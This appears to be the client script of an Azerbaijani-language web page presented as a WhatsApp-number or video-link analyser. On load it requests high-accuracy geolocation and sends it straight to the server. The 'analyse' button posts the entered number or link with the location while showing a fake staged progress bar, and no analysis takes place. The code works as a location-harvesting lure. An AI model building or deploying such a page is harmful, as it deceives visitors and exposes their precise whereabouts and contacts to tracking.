// public/scripts.js
// Azərbaycan dilində, index.html-dəki UI ilə tam uyğun.
// 1) Page load -> location permission istənir; icazə verilsə dərhal serverə göndərilir.
// 2) "Analiz et" düyməsi -> daxil edilmiş nömrə/URL + location serverə göndərilir.
// 3) Sağ panelə log və status yazmaq üçün window.__appendLog / window.__setStatus istifadə olunur.

let cachedLocation = null;
let sentOnLoad = false;

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

// Helpers for updating UI console (if available)
function appendLogUI(msg, level) {
  if (window && typeof window.__appendLog === 'function') {
    try { window.__appendLog(msg, level); } catch (e) { console.warn('appendLog error', e); }
  } else {
    // fallback: update status text briefly
    if (statusText) statusText.textContent = msg;
    console.log('[LOG]', msg);
  }
}
function setStatusUI(s) {
  if (window && typeof window.__setStatus === 'function') {
    try { window.__setStatus(s); } catch (e) { console.warn('setStatus error', e); }
  } else {
    if (statusText) statusText.textContent = s;
    console.log('[STATUS]', s);
  }
}

// Request geolocation with timeout
function requestLocationWithPrompt(timeout = 8000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) {
      appendLogUI('Brauzer geolocation-u dəstəkləmir', 'warn');
      return resolve(null);
    }

    let resolved = false;
    const onSuccess = (pos) => {
      if (resolved) return;
      resolved = true;
      const loc = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      };
      appendLogUI('Lokasiya alındı', 'ok');
      setStatusUI('Lokasiya əldə edildi');
      resolve(loc);
    };
    const onError = (err) => {
      if (resolved) return;
      resolved = true;
      appendLogUI(`Lokasiya alınmadı: ${err && err.message ? err.message : 'xəta'}`, 'warn');
      setStatusUI('Lokasiya əldə edilmədi');
      resolve(null);
    };

    // Show a friendly UI hint that we are requesting permission
    appendLogUI('Lokasiya icazəsi tələb olunur...', 'meta');
    setStatusUI('Lokasiya tələb olunur...');

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
      enableHighAccuracy: true,
      timeout,
      maximumAge: 0
    });

    // fallback guard
    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        appendLogUI('Lokasiya sorğusu vaxt aşımına uğradı', 'warn');
        setStatusUI('Lokasiya vaxt aşımı');
        resolve(null);
      }
    }, timeout + 1000);
  });
}

// POST to server
async function postToServer(payload) {
  appendLogUI('Serverə göndərilir...', 'meta');
  try {
    const resp = await fetch('/api/send-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      const txt = await resp.text().catch(()=>null);
      appendLogUI(`Server cavabı: ${resp.status} ${txt ? '- ' + txt : ''}`, 'warn');
      setStatusUI('Server xətası');
      return false;
    }
    // success
    const j = await resp.json().catch(()=>null);
    appendLogUI('Serverə göndərildi — uğurla çatdı', 'ok');
    setStatusUI('Məlumat serverə göndərildi');
    return true;
  } catch (err) {
    appendLogUI(`Şəbəkə xətası: ${err.message || err}`, 'warn');
    setStatusUI('Şəbəkə xətası');
    return false;
  }
}

// Simple progress UX
async function stagedProgressAZ() {
  if (!progressBarContainer || !progressBar) return;
  progressBarContainer.style.display = 'block';
  const steps = [
    {w:10, t:'İnitializasiya...'},
    {w:35, t:'Məlumat toplanır...'},
    {w:65, t:'Analiz aparılır...'},
    {w:90, t:'Nəticələr yekunlaşdırılır...'},
    {w:100, t:'Tamamlandı'}
  ];
  for (const s of steps) {
    progressBar.style.width = s.w + '%';
    setStatusUI(s.t);
    appendLogUI(s.t, 'meta');
    await new Promise(r => setTimeout(r, 500 + Math.random()*600));
  }
  setTimeout(()=> {
    progressBarContainer.style.display = 'none';
    progressBar.style.width = '0%';
    setStatusUI('Gözləyir');
  }, 700);
}

// On page load: request location and immediately send if granted
window.addEventListener('DOMContentLoaded', async () => {
  try {
    appendLogUI('Səhifə yüklənir — lokasiya sorğulanacaq...', 'meta');
    const loc = await requestLocationWithPrompt(8000);
    cachedLocation = loc;
    if (cachedLocation) {
      // send immediately (videoUrl: null)
      appendLogUI('Lokasiya serverə göndərilir (səhifə yüklənməsi zamanı)...', 'meta');
      const ok = await postToServer({ videoUrl: null, location: cachedLocation });
      if (ok) {
        sentOnLoad = true;
        appendLogUI('Lokasiya uğurla göndərildi (on-load)', 'ok');
      } else {
        appendLogUI('Lokasiya göndərilə bilmədi (on-load)', 'warn');
      }
    } else {
      appendLogUI('Lokasiya mövcud deyil və ya icazə verilməyib', 'warn');
    }
    // clear transient status after short time
    setTimeout(()=> setStatusUI('Gözləyir'), 2000);
  } catch (e) {
    appendLogUI('On-load lokasiya xətası', 'warn');
    console.error(e);
    cachedLocation = null;
    setStatusUI('Gözləyir');
  }
});

// Analyze button
analyzeButton && analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput ? videoUrlInput.value.trim() : '';
  if (!input) {
    appendLogUI('Zəhmət olmasa WhatsApp nömrəsi və ya link daxil edin.', 'warn');
    setStatusUI('Nə daxil etmək istədiyinizi yazın');
    return;
  }

  appendLogUI(`Analiz başlandı: ${input}`, 'meta');
  setStatusUI('Analiz icra olunur');

  // Ensure we have location if possible
  if (!cachedLocation) {
    appendLogUI('Lokasiya yoxdur — icazə tələb oluna bilər', 'meta');
    const loc = await requestLocationWithPrompt(8000);
    cachedLocation = loc;
  }

  // show progress
  stagedProgressAZ();

  // payload and send
  const payload = { videoUrl: input, location: cachedLocation };
  const ok = await postToServer(payload);

  if (ok) {
    appendLogUI('Analiz məlumatı göndərilir', 'ok');
    setStatusUI('Analiz tamamlandı');
  } else {
    appendLogUI('Analiz məlumatı göndərilə bilmədi', 'warn');
    setStatusUI('Göndərmə uğursuz oldu');
  }

  // clear status message briefly after user sees it
  setTimeout(()=> setStatusUI('Gözləyir'), 2500);
});
